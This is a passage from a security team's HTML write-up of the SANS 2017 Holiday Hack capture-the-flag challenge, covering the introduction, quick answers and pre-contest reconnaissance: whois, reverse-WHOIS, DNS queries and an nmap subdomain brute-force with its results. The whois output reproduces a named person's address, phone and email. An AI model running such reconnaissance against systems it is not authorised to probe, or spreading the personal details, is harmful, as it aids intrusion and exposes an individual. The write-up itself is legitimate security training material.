<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SANS 2017 Holiday Hack Writeup</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="NCSA Security Team" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<link rel="stylesheet" type="text/css" href="css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="css/readtheorg.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.stickytableheaders.min.js"></script>
<script type="text/javascript" src="js/readtheorg.js"></script>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<style>#content{max-width:1200px;}</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2017 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        displayAlign: "center",
        displayIndent: "0em",

        "HTML-CSS": { scale: 100,
                        linebreaks: { automatic: "false" },
                        webFont: "TeX"
                       },
        SVG: {scale: 100,
              linebreaks: { automatic: "false" },
              font: "TeX"},
        NativeMML: {scale: 100},
        TeX: { equationNumbers: {autoNumber: "AMS"},
               MultLineWidth: "85%",
               TagSide: "right",
               TagIndent: ".8em"
             }
});
</script>
<script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
</head>
<body>
<div id="content">
<h1 class="title">SANS 2017 Holiday Hack Writeup</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#org142ceeb">Introduction</a></li>
<li><a href="#orgbacbac5">tl;dr: Quick Answers</a></li>
<li><a href="#orga304efa">Pre-contest Reconnaissance</a>
<ul>
<li><a href="#org00d3163">Whois Searching</a></li>
<li><a href="#org33dc554">DNS Brute Forcing</a></li>
<li><a href="#org0658621">Certificate Transparency Logs</a></li>
<li><a href="#org3002524">Monitoring</a></li>
<li><a href="#orgb1d0f1d">And Then Things Changed&#x2026;</a></li>
<li><a href="#org257f225">Recon Summary</a></li>
</ul>
</li>
<li><a href="#org97daad7">Terminals</a>
<ul>
<li><a href="#orge72055a">Winter Wonder Landing</a>
<ul>
<li><a href="#landing_question">Question</a></li>
<li><a href="#landing_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#landing_background-information">Background Information</a></li>
<li><a href="#landing_goal">Goal</a></li>
<li><a href="#landing_hints">Hints</a></li>
<li><a href="#landing_approach">Approach</a></li>
<li><a href="#landing_solution">Solution</a></li>
<li><a href="#landing_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#org8d97bf6">Winconceivable The Cliffs Of Insanity</a>
<ul>
<li><a href="#cliffs_question">Question</a></li>
<li><a href="#cliffs_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#cliffs_background-information">Background Information</a></li>
<li><a href="#cliffs_goal">Goal</a></li>
<li><a href="#cliffs_hints">Hints</a></li>
<li><a href="#cliffs_approach">Approach</a></li>
<li><a href="#cliffs_solution">Solution</a></li>
<li><a href="#cliffs_alternatives">Alternatives</a></li>
<li><a href="#cliffs_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org0d9f0bd">Cryokinetic Magic</a>
<ul>
<li><a href="#cryokinetic_question">Question</a></li>
<li><a href="#cryokinetic_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#cryokinetic_background-information">Background Information</a></li>
<li><a href="#cryokinetic_goal">Goal</a></li>
<li><a href="#cryokinetic_hints">Hints</a></li>
<li><a href="#cryokinetic_approach">Approach</a></li>
<li><a href="#cryokinetic_solution">Solution</a></li>
<li><a href="#cryokinetic_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#org7426979">There's Snow Place Like Home</a>
<ul>
<li><a href="#home_question">Question</a></li>
<li><a href="#home_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#home_background-information">Background Information</a></li>
<li><a href="#home_goal">Goal</a></li>
<li><a href="#home_hints">Hints</a></li>
<li><a href="#home_approach">Approach</a></li>
<li><a href="#home_solution">Solution</a></li>
<li><a href="#home_alternatives">Alternatives</a></li>
<li><a href="#home_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#orgcc00746">Bumble's Bounce</a>
<ul>
<li><a href="#bounce_question">Question</a></li>
<li><a href="#bounce_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#bounce_background-information">Background Information</a></li>
<li><a href="#bounce_goal">Goal</a></li>
<li><a href="#bounce_hints">Hints</a></li>
<li><a href="#bounce_approach">Approach</a></li>
<li><a href="#bounce_solution">Solution</a></li>
<li><a href="#bounce_alternatives">Alternatives</a></li>
<li><a href="#bounce_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org38bbc1f">I Don't Think We're In Kansas Anymore</a>
<ul>
<li><a href="#kansas_question">Question</a></li>
<li><a href="#kansas_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#kansas_background-information">Background Information</a></li>
<li><a href="#kansas_goal">Goal</a></li>
<li><a href="#kansas_hints">Hints</a></li>
<li><a href="#kansas_approach">Approach</a></li>
<li><a href="#kansas_solution">Solution</a></li>
<li><a href="#kansas_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#orgb7097c9">Oh Wait Maybe We Are</a>
<ul>
<li><a href="#we_are_question">Question</a></li>
<li><a href="#we_are_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#we_are_background-information">Background Information</a></li>
<li><a href="#we_are_goal">Goal</a></li>
<li><a href="#we_are_approach">Hints</a></li>
<li><a href="#we_are_approach">Approach</a></li>
<li><a href="#we_are_solution">Solution</a></li>
<li><a href="#we_are_alternatives">Alternatives</a></li>
<li><a href="#we_are_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org3796072">We're Off To See The</a>
<ul>
<li><a href="#off_question">Question</a></li>
<li><a href="#off_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#off_background-information">Background Information</a></li>
<li><a href="#off_goal">Goal</a></li>
<li><a href="#off_hints">Hints</a></li>
<li><a href="#off_approach">Approach</a></li>
<li><a href="#off_solution">Solution</a></li>
<li><a href="#off_alternatives">Alternatives</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org1ba92da">Answers</a>
<ul>
<li><a href="#orgaa66a23">Game: This Page Fell off a Truck</a>
<ul>
<li><a href="#q1_question">Question</a></li>
<li><a href="#q2_solution">Solution</a></li>
</ul>
</li>
<li><a href="#orgebef2d2">L2S: Letters to Santa</a>
<ul>
<li><a href="#q2_question">Question</a></li>
<li><a href="#q2_background-information">Background Information</a></li>
<li><a href="#q2_goal">Goal</a></li>
<li><a href="#q2_approach">Approach</a></li>
<li><a href="#q2_solution">Solution</a></li>
<li><a href="#q2_alternatives">Alternatives</a></li>
<li><a href="#q2_common-pitfalls">Common Pitfalls</a></li>
<li><a href="#q2_about-the-challenge">About the Challenge</a></li>
<li><a href="#orgdf3f7c6">Moving Foward</a></li>
</ul>
</li>
<li><a href="#org7d692ef">SMB: Windows Fileshare</a>
<ul>
<li><a href="#q3_question">Question</a></li>
<li><a href="#q3_background-information">Background Information</a></li>
<li><a href="#q3_goal">Goal</a></li>
<li><a href="#q3_approach">Approach</a></li>
<li><a href="#q3_solution">Solution</a></li>
<li><a href="#q3_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org596627a">EWA: JWT All the Way</a>
<ul>
<li><a href="#q4_question">Question</a></li>
<li><a href="#q4_background-information">Background Information</a></li>
<li><a href="#q4_goal">Goal</a></li>
<li><a href="#q4_approach">Approach</a></li>
<li><a href="#q4_solution">Solution</a></li>
<li><a href="#q4_alternatives">Alternatives</a></li>
<li><a href="#q4_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org53b0b7f">NPPD: Naughty Moles</a>
<ul>
<li><a href="#q5_question">Question</a></li>
<li><a href="#q5_background-information">Background Information</a></li>
<li><a href="#q5_goal">Goal</a></li>
<li><a href="#q5_approach">Approach</a></li>
<li><a href="#q5_solution">Solution</a></li>
</ul>
</li>
<li><a href="#orgcb57184">EaaS: XML, XXE, and DTD &#x2013; Oh My!</a>
<ul>
<li><a href="#q6_question">Question</a></li>
<li><a href="#q6_background-information">Background Information</a></li>
<li><a href="#q6_goal">Goal</a></li>
<li><a href="#q6_approach">Approach</a></li>
<li><a href="#q6_solution">Solution</a></li>
<li><a href="#q6_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#orgc8b92ea">EMI: Going Deep</a>
<ul>
<li><a href="#q7_question">Question</a></li>
<li><a href="#q7_background-information">Background Information</a></li>
<li><a href="#q7_goal">Goal</a></li>
<li><a href="#q7_approach">Approach</a></li>
<li><a href="#q7_solution">Solution</a></li>
<li><a href="#org72810f0">Going Deeper &#x2013; Command Execution</a></li>
<li><a href="#org9365081">Level 2 &#x2013; Meterpreter Shell</a></li>
<li><a href="#org5fc1d1f">Getting Alabaster's Password</a></li>
<li><a href="#org21945fb">Next up &#x2013; Privilege Escalation!</a></li>
</ul>
</li>
<li><a href="#orgffdd718">EDB: eLfDAP Injection</a>
<ul>
<li><a href="#q8_question">Question</a></li>
<li><a href="#q8_background-information">Background Information</a></li>
<li><a href="#q8_goal">Goal</a></li>
<li><a href="#q8_approach">Approach</a></li>
<li><a href="#q8_solution">Solution</a></li>
<li><a href="#q8_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#org532433a">Fin: The Evil Good Witch</a>
<ul>
<li><a href="#q9_question">Question</a></li>
<li><a href="#q9_solution">Solution</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgd97fdc0">Easter Eggs</a>
<ul>
<li><a href="#orgbf860e6">Story Page</a>
<ul>
<li><a href="#org27622ff">Wintered logo is based on the Wicked stage musical poster.</a></li>
<li><a href="#org8d84b45">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
</ul>
</li>
<li><a href="#orgbfa5115">North Pole and Beyond</a>
<ul>
<li><a href="#org11ea36a">Stocking</a></li>
<li><a href="#orga7d20aa">Exploration</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orga6c7ef6">Appendices</a>
<ul>
<li><a href="#org5542774">Command Execution with pip</a></li>
<li><a href="#org0ebb181">Cracking Passphrases</a>
<ul>
<li><a href="#org9c4a0f4">Finding a Wordlist</a></li>
</ul>
</li>
<li><a href="#org5350643">Collaboration</a></li>
<li><a href="#orgeb85717">Command Reference</a></li>
<li><a href="#org7aa75f4">External Resources</a></li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-org142ceeb" class="outline-2">
<h2 id="org142ceeb">Introduction</h2>
<div class="outline-text-2" id="text-org142ceeb">
<p>
We are the Security team at the National Center for Supercomputing
Applications, and we worked together on yet another fun SANS Holiday
Hack, like we did last year. Over the past year, we've been surprised
to see how many skills and tricks from the 2016 Holiday Hack we used
for our jobs.
</p>

<p>
We've done "red-team" work such as code reviews and pen-tests, where
we encountered insufficient PHP input sanitization, development files
being left in production, and services being unintentionally
exposed. Our role in these instances is to find these issues before
someone malicious does, and to help and educate our users to
understand and prevent this from reoccuring. Other work we do is in
architecting defenses and mitigations. How do we secure systems and
services, while being as transparent as possible to end-users?
</p>

<p>
As we do red-team work, it's useful to try to think like a defender:
"How would <b>I</b> have secured this system, and are there any ways around
that?" Similarly, as we do blue-team work, we need to know the methods
and tools that an attacker would use.
</p>

<p>
Our approach for this year's Holiday Hack was to stick as closely as
possible to the hints, blog posts, and tools provided. &#x2026;and then to
try to elevate privileges, crack passwords, and see what other
information we could find, all while taking care to stay within the
scope of the challenge. We also tried to automate as much of our work
as possible, and we make these tools publicly available.
</p>
</div>
</div>
<div id="outline-container-orgbacbac5" class="outline-2">
<h2 id="orgbacbac5">tl;dr: Quick Answers</h2>
<div class="outline-text-2" id="text-orgbacbac5">
<ol class="org-ol">
<li>What is the title of the first page? <b>About This Book&#x2026;</b></li>
<li>What is the topic of The Great Book page available in the web root of the server? <b>On the Topic of Flying Animals</b><br />
What is Alabaster Snowball's password? <b>stream_unhappy_buy_loss</b></li>
<li>What is the file server share name? <b>FileStor</b></li>
<li>What can you learn from The Great Book page found in an e-mail on EWA? <b>The behavior of the Abominable Snowman ("Bumble") has recently become erratic. Rumor has it that there must've been some magic in something he ate.</b></li>
<li>How many infractions are required to be marked as naughty? <b>4</b><br />
What are the names of at least six insider threat moles? <b>Isabel Mehta, Nina Fitzgerald, Kirsty Evans, Sheri Lewis, Beverly Khalil, Christy Srivastava</b><br />
Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof? <b>The Abominable Snow Monster, Bumble</b>. Based on a chat with Sam the Snowman.</li>
<li>What is the title of The Great Book page on EAAS? <b>The Dreaded Inter-Dimensional Tornadoes</b></li>
<li>What does The Great Book page on EMI describe? <b>The Witches of Oz</b></li>
<li>Who wrote the letter to Santa on edb? <b>The Wizard of Oz</b></li>
<li>Which character is the villain, and what is the motive? <b>Glinda, the Good Witch. To stir up elf-munchkin hostilities and sell her magic to both sides.</b></li>
</ol>
</div>
</div>
<div id="outline-container-orga304efa" class="outline-2">
<h2 id="orga304efa">Pre-contest Reconnaissance</h2>
<div class="outline-text-2" id="text-orga304efa">

<div class="figure">
<p><img src="./images/sans_holiday_hack_preview.png" alt="sans_holiday_hack_preview.png" />
</p>
<p><span class="figure-number">Figure 1: </span>SANS Holiday Hack Challenge December 5th Update</p>
</div>

<p>
On December 5th, the SANS Holiday Hack Challenge was updated to tell
us that the 2017 Hack was coming soon, and encouraging us to catch up
on past challenges. The next day, we started doing just that. In
addition to reviewing previous challenges, we also began some
reconnaissance for the 2017 challenge.
</p>

<p>
Recon is a crucial step of any good penetration test, and is one that
often gets skipped in a "Capture the Flag" type of competition, since
most of the information is provided. Nevertheless, let's see what we
can find. The more information we have ahead of time, the better
prepared we'll be, and the less work we'll have to do during the
actual contest.
</p>

<p>
Much like how attackers will have indicators of compromise (IOCs)
which allow us to track and follow an individual attacker, the Counter
Hack team also does similar things every year, and will leave behind
some clues.
</p>
</div>

<div id="outline-container-org00d3163" class="outline-3">
<h3 id="org00d3163">Whois Searching</h3>
<div class="outline-text-3" id="text-org00d3163">
<p>
For example, the 2016 contest made use of the domain
www.northpolewonderland.com. We can look at publicly available WHOIS
data for that domain:
</p>

<div class="org-src-container">
<pre class="src src-sh">whois northpolewonderland.com | grep Registrant
</pre>
</div>

<pre class="example">
Registrant Name: Edward Skoudis
Registrant Organization: Counter Hack
Registrant Street: 2402 Alexandra Court
Registrant City: Howell
Registrant State/Province: New Jersey
Registrant Postal Code: 07731
Registrant Country: US
Registrant Phone: +1.7327511024
Registrant Phone Ext:
Registrant Fax: +1.7327511024
Registrant Fax Ext:
Registrant Email: edskoudis@yahoo.com
</pre>

<p>
There are a few services that allow you to do a "reverse WHOIS"
search, to search for domains by WHOIS data. For instance to search
for other domains where "edskoudis@yahoo.com" shows up in the contact
info: 
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Domain Name</th>
<th scope="col" class="org-right">Creation Date</th>
<th scope="col" class="org-left">Registrar</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-right">2017-10-19</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">1hrctf.com</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">1hrctf.org</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">cranbian.org</td>
<td class="org-right">2016-11-22</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">hackfestchallenge.com</td>
<td class="org-right">2016-10-20</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">onehourctf.org</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">atnascorp.com</td>
<td class="org-right">2015-11-10</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">ginormouselectronicssupplier.com</td>
<td class="org-right">2015-12-09</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.com</td>
<td class="org-right">2015-11-02</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.org</td>
<td class="org-right">2015-11-02</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">digimeme.org</td>
<td class="org-right">2013-11-18</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">syn-pi.org</td>
<td class="org-right">2013-11-18</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">pseudovision.net</td>
<td class="org-right">2010-09-09</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">counterhack.net</td>
<td class="org-right">2001-06-22</td>
<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="org-left">skoudis.com</td>
<td class="org-right">2001-06-22</td>
<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="org-left">counterhack.com</td>
<td class="org-right">2000-05-30</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>
</tbody>
</table>

<p>
This isn't comprehensive, since northpolewonderland.com didn't show up
in the results, but cranbian.org was another domain from 2016 that
does show up.
</p>

<p>
There are a couple of new entries since the 2016 contest, 1hrctf and
northpolechristmastown.com. 1hrctf seems unrelated, but it's a good
bet that northpolechristmastown.com will show up in the 2017
challenge.
</p>

<p>
At this point, we have to proceed with extreme caution. Since the
contest hasn't started, nothing is in scope yet. Any further digging
should be as unintrusive as possible.
</p>
</div>
</div>

<div id="outline-container-org33dc554" class="outline-3">
<h3 id="org33dc554">DNS Brute Forcing</h3>
<div class="outline-text-3" id="text-org33dc554">
<p>
Now that we have a domain we're interested in, let's look at DNS:
</p>

<div class="org-src-container">
<pre class="src src-sh">dig ANY northpolechristmastown.com
</pre>
</div>

<pre class="example">
;; ANSWER SECTION:
northpolechristmastown.com. 5	IN	TXT	"v=spf1 include:_spf.google.com -all"
northpolechristmastown.com. 5	IN	MX	30 ALT2.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	40 ASPMX2.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	20 ALT1.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	50 ASPMX3.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	10 ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	SOA	ns53.domaincontrol.com. dns.jomax.net. 2017120112 28800 7200 604800 600
northpolechristmastown.com. 5	IN	NS	ns54.domaincontrol.com.
northpolechristmastown.com. 5	IN	NS	ns53.domaincontrol.com.
</pre>

<p>
From this, we can tell that GMail provides the e-mail for the domain,
and GoDaddy provides the DNS service. Of note, however, is that there
are no A or AAAA records, so northpolechristmastown.com does not
resolve to anything.
</p>

<p>
Next, we'll try some Google dorking. Googling for
site:northpolechristmastown.com reveals
nppd.northpolechristmastown.com, which is a Sign In page for the
North Pole Police Department. It looks like nppd uses Google OAuth
for authentication, and most pages are forbidden with a regular GMail
account.
</p>

<p>
Checking a few other common URLs on nppd, we can find some resources
that are available, including favicon.ico and robots.txt:
</p>
<pre class="example">
User-agent: hk-47
Disallow: /
Disallow: /needhelp
Disallow: /infractions
Disallow: /community
Disallow: /about

User-agent: threepio
Sand-Crawler-delay: 421

User-agent: artoo
Sand-Crawler-delay: 2187
</pre>


<div class="figure">
<p><img src="./images/nppd_star.png" alt="nppd_star.png" />
</p>
<p><span class="figure-number">Figure 2: </span>North Pole Police Department Logo</p>
</div>

<p>
Everything here but /infractions is forbidden. Looking at that page
returns a list of infractions, such as "Unauthorized access to cookie
jar" or "Computer infraction: Accessing siblings files without
permission." We also see some interesting infractions that refer to
previous Holiday Hacks:
</p>

<pre class="example">
    {
        "date": "2016-12-25T00:00:00",
        "name": "Dr. Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    },
    {
        "date": "2015-12-25T00:00:00",
        "name": "Cindy Lou Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    }
],
"query": "name:Who"
</pre>

<p>
Going back to DNS, we can try to enumerate some hosts under the top
level domain. FuzzDB has a nice list of common DNS name, and we can
use an nmap script to try to query those:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ nmap --script dns-brute --script-args dns-brute.domain=northpolechristmastown.com,dns-brute.threads=1,dns-brute.hostlist=fuzzdb/discovery/dns/dnsmapCommonSubdomains.txt
</pre>
</div>

<pre class="example">
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-06 18:54 CST
Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Pre-scan script results:
| dns-brute:
|   DNS Brute-force hostnames:
|     intranet.northpolechristmastown.com - 35.196.239.128
|     files.northpolechristmastown.com - 35.185.43.23
|     dev.northpolechristmastown.com - 35.185.84.51
|     admin.northpolechristmastown.com - 35.185.115.185
|_    mail.northpolechristmastown.com - 35.185.115.185
</pre>

<p>
A couple of other lists resulted in the following hostnames as well:
</p>

<pre class="example">
